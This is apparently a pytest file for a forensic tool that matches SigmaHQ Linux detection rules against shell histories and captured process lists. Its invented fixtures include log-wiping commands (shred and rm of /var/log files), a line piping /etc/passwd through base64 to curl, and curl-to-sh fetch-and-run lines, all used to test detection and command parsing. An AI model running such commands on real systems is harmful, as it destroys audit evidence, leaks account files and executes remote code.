"""v0.7.166: SigmaHQ's Linux process_creation rules over what a host ran -- its
shell histories and the processes UAC's `ps` captured -- not only over auditd
EXECVE records, which the measured hosts never had. Values are invented."""
from __future__ import annotations

import csv
import logging
from pathlib import Path

import pytest

from artifact_engine.core.runner import ParserContext
from artifact_engine.core.sigma_engine import load_rules
from artifact_engine.handlers import lin_sigma

if not load_rules():
    pytest.skip("pysigma or the bundled Linux ruleset is not available", allow_module_level=True)

CLEAR_LOGS = "80915f59-9b56-4616-9de0-fd0dea6c12fe"      # Linux Logs Clearing Attempts


def _run(tmp_path: Path) -> list[dict]:
    out = tmp_path / "CSVs"
    lin_sigma.run(ParserContext(evidence=tmp_path, out=out, tools=tmp_path, assets=tmp_path,
                                machine_name="HOST-01", volume="root",
                                log=logging.getLogger("aeng.test")))
    path = out / "log_sigma.csv"
    if not path.is_file():
        return []
    with open(path, encoding="utf-8", newline="") as fh:
        return list(csv.DictReader(fh))


def _history(tmp_path: Path, text: str, home: str = "home/jdoe") -> None:
    d = tmp_path / "[root]" / home
    d.mkdir(parents=True, exist_ok=True)
    (d / ".bash_history").write_text(text, encoding="utf-8")


def test_a_command_in_a_shell_history_fires_its_process_creation_rule(tmp_path):
    _history(tmp_path, "#1700000000\ncd /tmp && shred -u /var/log/auth.log\nls\n")
    rows = [r for r in _run(tmp_path) if r["rule_id"] == CLEAR_LOGS]
    # the chained command is the one that matched, with its source and time
    assert [(r["source"], r["match"], r["timestamp"]) for r in rows] == [
        ("shell_history", "shred -u /var/log/auth.log", "2023-11-14 22:13:20")]


def test_a_process_ps_captured_fires_it_too(tmp_path):
    lr = tmp_path / "live_response" / "process"
    lr.mkdir(parents=True)
    (lr / "ps_-axo_pid_user_lstart_args.txt").write_text(
        "  PID USER     STARTED                  COMMAND\n"
        "  412 root     Tue Nov 14 22:13:20 2023 /usr/bin/rm -rf /var/log/journal\n",
        encoding="utf-8")
    (tmp_path / "[root]").mkdir()
    rows = [r for r in _run(tmp_path) if r["rule_id"] == CLEAR_LOGS]
    # ps's start time, in the host's local time, written so it sorts
    assert [(r["source"], r["match"], r["timestamp"]) for r in rows] == [
        ("processes", "/usr/bin/rm -rf /var/log/journal", "2023-11-14 22:13:20")]


def test_only_process_creation_rules_read_the_commands(tmp_path):
    """A keyword rule written for log lines must not fire on a typed command:
    `python -m SimpleHTTPServer` is one of `lnx_shell_susp_commands`' keywords."""
    _history(tmp_path, "python -m SimpleHTTPServer 8000\nshred /var/log/syslog\n")
    process_ids = {r.rule_id for r in load_rules() if r.category == "process_creation"}
    rows = _run(tmp_path)
    assert rows and all(r["rule_id"] in process_ids for r in rows)


def test_one_line_is_the_commands_it_chains():
    assert lin_sigma._commands("cat /etc/passwd | base64 -w0 | curl -d @- http://x") == [
        "cat /etc/passwd", "base64 -w0", "curl -d @- http://x"]
    assert lin_sigma._commands('echo "a|b;c" && id || true') == ['echo "a|b;c"', "id", "true"]
    assert lin_sigma._commands("sleep 1 & whoami") == ["sleep 1", "whoami"]
    assert lin_sigma._commands("make 2>&1 | tee log") == ["make 2>&1", "tee log"]
    assert lin_sigma._commands("cmd &> /dev/null; id") == ["cmd &> /dev/null", "id"]
    assert lin_sigma._commands("a |& b") == ["a", "b"]


def test_a_bare_command_name_is_written_as_a_path():
    assert lin_sigma._image("curl -s http://x") == "/curl"
    assert lin_sigma._image("FOO=1 /tmp/.x/run -a") == "/tmp/.x/run"
    assert lin_sigma._image("A=1") == ""



def test_what_runs_inside_a_substitution_or_subshell_is_a_command_too():
    """`$(...)`, backquotes and `(...)` are never split through, and what runs in
    them is listed after the line's own commands: the `curl` in
    `out=$(curl ...)` ran, though the line starts with an assignment."""
    assert lin_sigma._commands("echo $(curl -s http://10.0.0.5/x | sh)") == [
        "echo $(curl -s http://10.0.0.5/x | sh)", "curl -s http://10.0.0.5/x", "sh"]
    assert lin_sigma._commands("x=`id; uname` ; ls") == ["x=`id; uname`", "ls", "id", "uname"]
    assert lin_sigma._commands("(cd /tmp; ./run) && id") == ["id", "cd /tmp", "./run"]
    assert lin_sigma._commands("out=$(curl -s http://x/a)") == [
        "out=$(curl -s http://x/a)", "curl -s http://x/a"]
    assert lin_sigma._commands("echo $((1+2)); id") == ["echo $((1+2))", "id"]
    assert lin_sigma._commands("echo a >| out; id") == ["echo a >| out", "id"]
    assert lin_sigma._commands("unbalanced $(curl x | sh") == ["unbalanced $(curl x | sh"]
    assert lin_sigma._image("x=$(c; d) e") == "/e"
    assert lin_sigma._image("(whoami;id)") == "/whoami"


def test_a_comment_runs_nothing():
    assert lin_sigma._commands("make # then; shred -u /var/log/auth.log") == ["make"]
    assert lin_sigma._commands('echo "a # b"; id') == ['echo "a # b"', "id"]
    assert lin_sigma._commands("a#b; id") == ["a#b", "id"]


def test_first_and_last_are_the_earliest_and_latest_time(tmp_path):
    """Rows are loaded user by user, not in time order."""
    _history(tmp_path, "#1700086400\nshred -u /var/log/auth.log\n", home="home/jdoe")
    _history(tmp_path, "shred -u /var/log/auth.log\n#1700000000\nshred -u /var/log/auth.log\n",
             home="root")
    [row] = [r for r in _run(tmp_path) if r["rule_id"] == CLEAR_LOGS]
    assert (row["timestamp"], row["last_timestamp"], row["count"]) == (
        "2023-11-14 22:13:20", "2023-11-15 22:13:20", "3")


def test_ps_start_times_sort():
    assert lin_sigma._lstart("Tue Nov 14 22:13:20 2023") == "2023-11-14 22:13:20"
    assert lin_sigma._lstart("not a time") == "not a time"


def test_a_command_typed_and_seen_running_is_two_detections(tmp_path):
    _history(tmp_path, "rm -rf /var/log/journal\n")
    lr = tmp_path / "live_response" / "process"
    lr.mkdir(parents=True)
    (lr / "ps_-axo_pid_user_lstart_args.txt").write_text(
        "  PID USER     STARTED                  COMMAND\n"
        "  412 root     Tue Nov 14 22:13:20 2023 rm -rf /var/log/journal\n", encoding="utf-8")
    rows = [r for r in _run(tmp_path) if r["rule_id"] == CLEAR_LOGS]
    assert sorted((r["source"], r["count"]) for r in rows) == [
        ("processes", "1"), ("shell_history", "1")]


def test_informational_rules_do_not_read_the_commands(tmp_path):
    """SigmaHQ's `informational` level is context, not an alert: every `rm` in a
    history was a "File Deletion" row."""
    _history(tmp_path, "rm /tmp/notes.txt\nshred /var/log/syslog\n")
    levels = {r["level"] for r in _run(tmp_path)}
    assert levels and "informational" not in levels
